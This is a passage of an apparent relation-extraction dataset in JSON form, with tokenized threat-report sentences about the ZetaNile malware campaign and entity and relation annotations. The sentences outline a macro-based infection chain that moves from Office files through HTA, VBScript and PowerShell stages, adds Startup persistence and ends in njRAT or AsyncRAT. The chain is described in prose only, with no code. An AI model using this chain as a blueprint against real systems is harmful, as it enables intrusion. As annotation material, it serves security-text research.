4}, {"r": "FR", "evidence": [2, 3, 4, 5], "h": 2, "t": 5}, {"r": "EX", "evidence": [4, 5], "t": 4, "h": 5}, {"r": "FR", "evidence": [5], "t": 8, "h": 11}, {"r": "RD", "evidence": [5], "t": 7, "h": 8}, {"r": "WR", "evidence": [5], "t": 7, "h": 8}, {"r": "ST", "evidence": [5], "h": 8, "t": 9}, {"r": "FR", "evidence": [5], "h": 5, "t": 11}, {"r": "RD", "evidence": [5], "t": 7, "h": 8}, {"r": "EX", "evidence": [5], "t": 10, "h": 11}, {"r": "CO", "evidence": [5], "h": 6, "t": 10}]}, {"title": "051-0", "sents": [["As", "part", "of", "the", "ZetaNile", "campaign", ",", "some", "Word", "documents", "have", "been", "found", "to", "utilize", "relationship", "definitions", "to", "load", "XLSM", "files", "embedded", "within", "them", ".", "These", "XLSM", "files", "contain", "the", "VBA", "code", "that", "enables", "the", "downloading", "of", "payloads", "."], ["Furthermore", ",", "additional", "malign", "XLSM", "files", "are", "loaded", "during", "runtime", "."], ["These", "maldocs", "are", "Office", "Open", "XML", "documents", "consisting", "of", "two", "critical", "relationship", "definition", "files", "--", "the", "primary", "one", "named", "``", "AquiTaLimpo.xml.rels", "''", "and", "the", "other", "called", "``", "comments.xml.rels", "''", ".", "These", "files", "link", "to", "the", "embedded", "XLSM", "files", "containing", "the", "VBA", "code", "."], ["The", "VBA", "code", "is", "activated", "through", "a", "macro", "when", "the", "Word", "document", "is", "opened", ",", "and", "Excel", "is", "subsequently", "loaded", "to", "open", "the", "XLSM", "files", "embedded", "in", "the", "document", ",", "allowing", "the", "macro", "to", "initiate", "the", "download", "of", "payloads", "."], ["PPAM", "files", "are", "supplementary", "files", "utilized", "by", "Microsoft", "PowerPoint", "to", "enable", "enhanced", "functionality", ",", "including", "custom", "macros", ",", "tools", ",", "and", "commands", "."], ["The", "attack", "chain", "ultimately", "results", "in", "the", "deployment", "of", "a", "RAT", ",", "which", "could", "either", "be", "njRAT", "or", "AsyncRAT", "."], ["The", "earliest", "instance", "of", "this", "attack", "chain", "involves", "a", "malign", "macro", "within", "the", "PPAM", "file", "that", "downloads", "and", "runs", "a", "remote", "HTA", "file", "via", "an", "attacker-controlled", "location", "."], ["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "campaign", "pos": [5, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [8, 8], "name": "Word documents", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [19, 19], "name": "XLSM files", "pos": [19, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [30, 30], "name": "VBA code", "pos": [30, 32], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [37, 37], "name": "payloads", "pos": [37, 38], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "XLSM files", "pos": [4, 6], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [51, 51], "name": "maldocs", "pos": [1, 2], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [53, 53], "name": "Office Open XML documents", "pos": [3, 7], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "AquiTaLimpo.xml.rels", "pos": [20, 21], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [77, 77], "name": "comments.xml.rels", "pos": [27, 28], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [86, 86], "name": "XLSM files", "pos": [36, 38], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [90, 90], "name": "VBA code", "pos": [40, 42], "index": "11_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [103, 103], "name": "Word document", "pos": [10, 12], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [109, 109], "name": "Excel", "pos": [16, 17], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [116, 116], "name": "XLSM files", "pos": [23, 25], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [125, 125], "name": "macro", "pos": [32, 33], "index": "15_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [131, 131], "name": "payloads", "pos": [38, 39], "index": "16_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "PPAM files", "pos": [0, 2], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [140, 140], "name": "Microsoft PowerPoint", "pos": [7, 9], "index": "18_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [148, 148], "name": "custom macros", "pos": [15, 17], "index": "19_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [151, 151], "name": "tools", "pos": [18, 19], "index": "20_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [154, 154], "name": "commands", "pos": [21, 22], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [157, 157], "name": "attack chain", "pos": [1, 3], "index": "22_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [172, 172], "name": "njRAT", "pos": [16, 17], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [174, 174], "name": "AsyncRAT", "pos": [18, 19], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [181, 181], "name": "attack chain", "pos": [5, 7], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [186, 186], "name": "macro", "pos": [10, 11], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [197, 197], "name": "HTA file", "pos": [21, 23], "index": "27_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [201, 201], "name": "attacker-controlled location", "pos": [25, 27], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [212, 212], "name": "HTA", "pos": [8, 9], "index": "29_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [217, 217], "name": "JavaScript snippet", "pos": [13, 15], "index": "30_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [224, 224], "name": "VBScript", "pos": [20, 21], "index": "31_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [240, 240], "name": "infection chain", "pos": [36, 38], "index": "32_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [246, 246], "name": "PowerShell script", "pos": [42, 44], "index": "33_0"}]], "labels": [{"r": "WR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "h": 0, "t": 3}, {"r": "WR", "evidence": [0], "h": 0, "t": 4}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 6}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 7}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 8}, {"r": "WR", "evidence": [0, 1, 2], "h": 0, "t": 9}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 10}, {"r": "CO", "evidence": [0, 1], "t": 2, "h": 5}, {"r": "CO", "evidence": [0, 1, 2], "t": 3, "h": 11}, {"r": "WR", "evidence": [2, 3], "t": 6, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 7, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 8, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 9, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 10, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 12}, {"r": "RD", "evidence": [3], "h": 13, "t": 14}, {"r": "EX", "evidence": [3], "h": 13, "t": 15}, {"r": "WR", "evidence": [3], "h": 13, "t": 16}, {"r": "WR", "evidence": [4], "t": 17, "h": 18}, {"r": "FR", "evidence": [4], "h": 18, "t": 19}, {"r": "FR", "evidence": [4], "h": 18, "t": 20}, {"r": "FR", "evidence": [4], "h": 18, "t": 21}, {"r": "FR", "evidence": [4, 5], "h": 21, "t": 22}, {"r": "WR", "evidence": [5], "h": 22, "t": 23}, {"r": "WR", "evidence": [5], "h": 22, "t": 23}, {"r": "WR", "evidence": [5], "h": 22, "t": 24}, {"r": "WR", "evidence": [5, 6], "t": 23, "h": 25}, {"r": "WR", "evidence": [5, 6], "t": 24, "h": 25}, {"r": "WR", "evidence": [6], "h": 25, "t": 26}, {"r": "WR", "evidence": [6], "h": 25, "t": 27}, {"r": "EX", "evidence": [6], "h": 25, "t": 27}, {"r": "ST", "evidence": [6], "h": 25, "t": 28}, {"r": "RF", "evidence": [6], "h": 25, "t": 28}, {"r": "EX", "evidence": [7], "h": 29, "t": 31}, {"r": "RD", "evidence": [7], "t": 31, "h": 32}, {"r": "WR", "evidence": [7], "h": 29, "t": 33}, {"r": "EX", "evidence": [7], "h": 29, "t": 33}, {"r": "WR", "evidence": [7], "h": 32, "t": 33}, {"r": "CO", "evidence": [7], "h": 29, "t": 30}]}, {"title": "051-1", "sents": [["Furthermore", ",", "additional", "malign", "XLSM", "files", "are", "loaded", "during", "runtime", "."], ["These", "maldocs", "are", "Office", "Open", "XML", "documents", "consisting", "of", "two", "critical", "relationship", "definition", "files", "--", "the", "primary", "one", "named", "``", "AquiTaLimpo.xml.rels", "''", "and", "the", "other", "called", "``", "comments.xml.rels", "''", ".", "These", "files", "link", "to", "the", "embedded", "XLSM", "files", "containing", "the", "VBA", "code", "."], ["The", "VBA", "code", "is", "activated", "through", "a", "macro", "when", "the", "Word", "document", "is", "opened", ",", "and", "Excel", "is", "subsequently", "loaded", "to", "open", "the", "XLSM", "files", "embedded", "in", "the", "document", ",", "allowing", "the", "macro", "to", "initiate", "the", "download", "of", "payloads", "."], ["PPAM", "files", "are", "supplementary", "files", "utilized", "by", "Microsoft", "PowerPoint", "to", "enable", "enhanced", "functionality", ",", "including", "custom", "macros", ",", "tools", ",", "and", "commands", "."], ["The", "attack", "chain", "ultimately", "results", "in", "the", "deployment", "of", "a", "RAT", ",", "which", "could", "either", "be", "njRAT", "or", "AsyncRAT", "."], ["The", "earliest", "instance", "of", "this", "attack", "chain", "involves", "a", "malign", "macro", "within", "the", "PPAM", "file", "that", "downloads", "and", "runs", "a", "remote", "HTA", "file", "via", "an", "attacker-controlled", "location", "."], ["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."], ["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "XLSM files", "pos": [4, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [12, 12], "name": "maldocs", "pos": [1, 2], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [14, 14], "name": "Office Open XML documents", "pos": [3, 7], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "AquiTaLimpo.xml.rels", "pos": [20, 21], "index": "3_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [38, 38], "name": "comments.xml.rels", "pos": [27, 28], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [47, 47], "name": "XLSM files", "pos": [36, 38], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [51, 51], "name": "VBA code", "pos": [40, 42], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "Word document", "pos": [10, 12], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [70, 70], "name": "Excel", "pos": [16, 17], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [77, 77], "name": "XLSM files", "pos": [23, 25], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [86, 86], "name": "macro", "pos": [32, 33], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [92, 92], "name": "payloads", "pos": [38, 39], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [94, 94], "name": "PPAM files", "pos": [0, 2], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [101, 101], "name": "Microsoft PowerPoint", "pos": [7, 9], "index": "13_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [109, 109], "name": "custom macros", "pos": [15, 17], "index": "14_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [112, 112], "name": "tools", "pos": [18, 19], "index": "15_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [115, 115], "name": "commands", "pos": [21, 22], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "attack chain", "pos": [1, 3], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [133, 133], "name": "njRAT", "pos": [16, 17], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [135, 135], "name": "AsyncRAT", "pos": [18, 19], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [142, 142], "name": "attack chain", "pos": [5, 7], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "macro", "pos": [10, 11], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [158, 158], "name": "HTA file", "pos": [21, 23], "index": "22_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [162, 162], "name": "attacker-controlled location", "pos": [25, 27], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [173, 173], "name": "HTA", "pos": [8, 9], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [178, 178], "name": "JavaScript snippet", "pos": [13, 15], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [185, 185], "name": "VBScript", "pos": [20, 21], "index": "26_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [201, 201], "name": "infection chain", "pos": [36, 38], "index": "27_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [207, 207], "name": "PowerShell script", "pos": [42, 44], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [213, 213], "name": "VB code", "pos": [2, 4], "index": "29_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 5}, {"r": "WR", "evidence": [1, 2], "t": 1, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 2, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 3, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 4, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 5, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "RD", "evidence": [2], "h": 8, "t": 9}, {"r": "EX", "evidence": [2], "h": 8, "t": 10}, {"r": "WR", "evidence": [2], "h": 8, "t": 11}, {"r": "WR", "evidence": [3], "t": 12, "h": 13}, {"r": "FR", "evidence": [3], "h": 13, "t": 14}, {"r": "FR", "evidence": [3], "h": 13, "t": 15}, {"r": "FR", "evidence": [3], "h": 13, "t": 16}, {"r": "FR", "evidence": [3, 4], "h": 16, "t": 17}, {"r": "WR", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [4], "h": 17, "t": 19}, {"r": "WR", "evidence": [4, 5], "t": 18, "h": 20}, {"r": "WR", "evidence": [4, 5], "t": 19, "h": 20}, {"r": "WR", "evidence": [5], "h": 20, "t": 21}, {"r": "WR", "evidence": [5], "h": 20, "t": 22}, {"r": "EX", "evidence": [5], "h": 20, "t": 22}, {"r": "ST", "evidence": [5], "h": 20, "t": 23}, {"r": "RF", "evidence": [5], "h": 20, "t": 23}, {"r": "EX", "evidence": [6], "h": 24, "t": 26}, {"r": "RD", "evidence": [6], "t": 26, "h": 27}, {"r": "WR", "evidence": [6], "h": 24, "t": 28}, {"r": "EX", "evidence": [6], "h": 24, "t": 28}, {"r": "WR", "evidence": [6], "h": 27, "t": 28}, {"r": "WR", "evidence": [6, 7], "h": 27, "t": 29}, {"r": "CO", "evidence": [6], "h": 24, "t": 25}]}, {"title": "051-2", "sents": [["These", "maldocs", "are", "Office", "Open", "XML", "documents", "consisting", "of", "two", "critical", "relationship", "definition", "files", "--", "the", "primary", "one", "named", "``", "AquiTaLimpo.xml.rels", "''", "and", "the", "other", "called", "``", "comments.xml.rels", "''", ".", "These", "files", "link", "to", "the", "embedded", "XLSM", "files", "containing", "the", "VBA", "code", "."], ["The", "VBA", "code", "is", "activated", "through", "a", "macro", "when", "the", "Word", "document", "is", "opened", ",", "and", "Excel", "is", "subsequently", "loaded", "to", "open", "the", "XLSM", "files", "embedded", "in", "the", "document", ",", "allowing", "the", "macro", "to", "initiate", "the", "download", "of", "payloads", "."], ["PPAM", "files", "are", "supplementary", "files", "utilized", "by", "Microsoft", "PowerPoint", "to", "enable", "enhanced", "functionality", ",", "including", "custom", "macros", ",", "tools", ",", "and", "commands", "."], ["The", "attack", "chain", "ultimately", "results", "in", "the", "deployment", "of", "a", "RAT", ",", "which", "could", "either", "be", "njRAT", "or", "AsyncRAT", "."], ["The", "earliest", "instance", "of", "this", "attack", "chain", "involves", "a", "malign", "macro", "within", "the", "PPAM", "file", "that", "downloads", "and", "runs", "a", "remote", "HTA", "file", "via", "an", "attacker-controlled", "location", "."], ["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."], ["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."], ["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "maldocs", "pos": [1, 2], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [3, 3], "name": "Office Open XML documents", "pos": [3, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "AquiTaLimpo.xml.rels", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [27, 27], "name": "comments.xml.rels", "pos": [27, 28], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [36, 36], "name": "XLSM files", "pos": [36, 38], "index": "4_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [40, 40], "name": "VBA code", "pos": [40, 42], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [53, 53], "name": "Word document", "pos": [10, 12], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [59, 59], "name": "Excel", "pos": [16, 17], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [66, 66], "name": "XLSM files", "pos": [23, 25], "index": "8_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [75, 75], "name": "macro", "pos": [32, 33], "index": "9_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [81, 81], "name": "payloads", "pos": [38, 39], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [83, 83], "name": "PPAM files", "pos": [0, 2], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [90, 90], "name": "Microsoft PowerPoint", "pos": [7, 9], "index": "12_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [98, 98], "name": "custom macros", "pos": [15, 17], "index": "13_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [101, 101], "name": "tools", "pos": [18, 19], "index": "14_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [104, 104], "name": "commands", "pos": [21, 22], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [107, 107], "name": "attack chain", "pos": [1, 3], "index": "16_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [122, 122], "name": "njRAT", "pos": [16, 17], "index": "17_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [124, 124], "name": "AsyncRAT", "pos": [18, 19], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [131, 131], "name": "attack chain", "pos": [5, 7], "index": "19_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [136, 136], "name": "macro", "pos": [10, 11], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [147, 147], "name": "HTA file", "pos": [21, 23], "index": "21_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [151, 151], "name": "attacker-controlled location", "pos": [25, 27], "index": "22_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [162, 162], "name": "HTA", "pos": [8, 9], "index": "23_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [167, 167], "name": "JavaScript snippet", "pos": [13, 15], "index": "24_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [174, 174], "name": "VBScript", "pos": [20, 21], "index": "25_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [190, 190], "name": "infection chain", "pos": [36, 38], "index": "26_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [196, 196], "name": "PowerShell script", "pos": [42, 44], "index": "27_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [202, 202], "name": "VB code", "pos": [2, 4], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [223, 223], "name": "PowerShell script", "pos": [7, 9], "index": "29_0"}]], "labels": [{"r": "WR", "evidence": [0, 1], "t": 0, "h": 6}, {"r": "WR", "evidence": [0, 1], "t": 1, "h": 6}, {"r": "WR", "evidence": [0, 1], "t": 2, "h": 6}, {"r": "WR", "evidence": [0, 1], "t": 3, "h": 6}, {"r": "WR", "evidence": [0, 1], "t": 4, "h": 6}, {"r": "WR", "evidence": [0, 1], "t": 5, "h": 6}, {"r": "WR", "evidence": [0, 1], "t": 5, "h": 6}, {"r": "RD", "evidence": [1], "h": 7, "t": 8}, {"r": "EX", "evidence": [1], "h": 7, "t": 9}, {"r": "WR", "evidence": [1], "h": 7, "t": 10}, {"r": "WR", "evidence": [2], "t": 11, "h": 12}, {"r": "FR", "evidence": [2], "h": 12, "t": 13}, {"r": "FR", "evidence": [2], "h": 12, "t": 14}, {"r": "FR", "evidence": [2], "h": 12, "t": 15}, {"r": "FR", "evidence": [2, 3], "h": 15, "t": 16}, {"r": "WR", "evidence": [3], "h": 16, "t": 17}, {"r": "WR", "evidence": [3], "h": 16, "t": 17}, {"r": "WR", "evidence": [3], "h": 16, "t": 18}, {"r": "WR", "evidence": [3, 4], "t": 17, "h": 19}, {"r": "WR", "evidence": [3, 4], "t": 18, "h": 19}, {"r": "WR", "evidence": [4], "h": 19, "t": 20}, {"r": "WR", "evidence": [4], "h": 19, "t": 21}, {"r": "EX", "evidence": [4], "h": 19, "t": 21}, {"r": "ST", "evidence": [4], "h": 19, "t": 22}, {"r": "RF", "evidence": [4], "h": 19, "t": 22}, {"r": "EX", "evidence": [5], "h": 23, "t": 25}, {"r": "RD", "evidence": [5], "t": 25, "h": 26}, {"r": "WR", "evidence": [5], "h": 23, "t": 27}, {"r": "EX", "evidence": [5], "h": 23, "t": 27}, {"r": "WR", "evidence": [5], "h": 26, "t": 27}, {"r": "WR", "evidence": [5, 6], "h": 26, "t": 28}, {"r": "CO", "evidence": [5], "h": 23, "t": 24}, {"r": "WR", "evidence": [6, 7], "t": 28, "h": 29}, {"r": "WR", "evidence": [6, 7], "t": 28, "h": 29}]}, {"title": "051-3", "sents": [["The", "VBA", "code", "is", "activated", "through", "a", "macro", "when", "the", "Word", "document", "is", "opened", ",", "and", "Excel", "is", "subsequently", "loaded", "to", "open", "the", "XLSM", "files", "embedded", "in", "the", "document", ",", "allowing", "the", "macro", "to", "initiate", "the", "download", "of", "payloads", "."], ["PPAM", "files", "are", "supplementary", "files", "utilized", "by", "Microsoft", "PowerPoint", "to", "enable", "enhanced", "functionality", ",", "including", "custom", "macros", ",", "tools", ",", "and", "commands", "."], ["The", "attack", "chain", "ultimately", "results", "in", "the", "deployment", "of", "a", "RAT", ",", "which", "could", "either", "be", "njRAT", "or", "AsyncRAT", "."], ["The", "earliest", "instance", "of", "this", "attack", "chain", "involves", "a", "malign", "macro", "within", "the", "PPAM", "file", "that", "downloads", "and", "runs", "a", "remote", "HTA", "file", "via", "an", "attacker-controlled", "location", "."], ["Stage", "1A", "of", "the", "attack", "entails", "a", "malign", "HTA", "that", "is", "an", "escaped", "JavaScript", "snippet", ",", "which", "then", "launches", "a", "VBScript", "(", "embedded", "in", "the", "HTA", ")", "to", "download", "and", "execute", "the", "next", "stage", "of", "the", "infection", "chain", "(", "Stage", "#", "2", "PowerShell", "script", ")", "."], ["An", "un-escaped", "VB", "code", "is", "used", "to", "download", "and", "execute", "Stage", "2", "on", "the", "endpoint", "."], ["When", "Stage", "2", "is", "initiated", ",", "a", "PowerShell", "script", "is", "executed", "on", "the", "endpoint", ",", "serving", "as", "the", "primary", "tool", "in", "the", "infection", "chain", "."], ["The", "script", "carries", "out", "several", "tasks", "on", "the", "endpoint", ",", "beginning", "by", "modifying", "the", "registry", "values", "to", "change", "the", "current", "user", "'s", "Startup", "folders", "to", "match", "those", "outlined", "in", "the", "script", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "Word document", "pos": [10, 12], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "Excel", "pos": [16, 17], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [23, 23], "name": "XLSM files", "pos": [23, 25], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [32, 32], "name": "macro", "pos": [32, 33], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [38, 38], "name": "payloads", "pos": [38, 39], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [40, 40], "name": "PPAM files", "pos": [0, 2], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [47, 47], "name": "Microsoft PowerPoint", "pos": [7, 9], "index": "6_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [55, 55], "name": "custom macros", "pos": [15, 17], "index": "7_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [58, 58], "name": "tools", "pos": [18, 19], "index": "8_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [61, 61], "name": "commands", "pos": [21, 22], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [64, 64], "name": "attack chain", "pos": [1, 3], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [79, 79], "name": "njRAT", "pos": [16, 17], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [81, 81], "name": "AsyncRAT", "pos": [18, 19], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "attack chain", "pos": [5, 7], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "macro", "pos": [10, 11], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [104, 104], "name": "HTA file", "pos": [21, 23], "index": "15_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [108, 108], "name": "attacker-controlled location", "pos": [25, 27], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [119, 119], "name": "HTA", "pos": [8, 9], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [124, 124], "name": "JavaScript snippet", "pos": [13, 15], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [131, 131], "name": "VBScript", "pos": [20, 21], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [147, 147], "name": "infection chain", "pos": [36, 38], "index": "20_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [153, 153], "name": "PowerShell script", "pos": [42, 44], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [159, 159], "name": "VB code", "pos": [2, 4], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [180, 180], "name": "PowerShell script", "pos": [7, 9], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [199, 199], "name": "script", "pos": [1, 2], "index": "24_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [212, 212], "name": "registry values", "pos": [14, 16], "index": "25_0"}], [{"type": "SF", "sent_id": 7, "global_pos": [220, 220], "name": "Startup folders", "pos": [22, 24], "index": "26_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 1, "t": 2}, {"r": "EX", "evidence": [0], "h": 1, "t": 3}, {"r": "WR", "evidence": [0], "h": 1, "t": 4}, {"r": "WR", "evidence": [1], "t": 5, "h": 6}, {"r": "FR", "evidence": [1], "h": 6, "t": 7}, {"r": "FR", "evidence": [1], "h": 6, "t": 8}, {"r": "FR", "evidence": [1], "h": 6, "t": 9}, {"r": "FR", "evidence": [1, 2], "h": 9, "t": 10}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 11}, {"r": "WR", "evidence": [2], "h": 10, "t": 12}, {"r": "WR", "evidence": [2, 3], "t": 11, "h": 13}, {"r": "WR", "evidence": [2, 3], "t": 12, 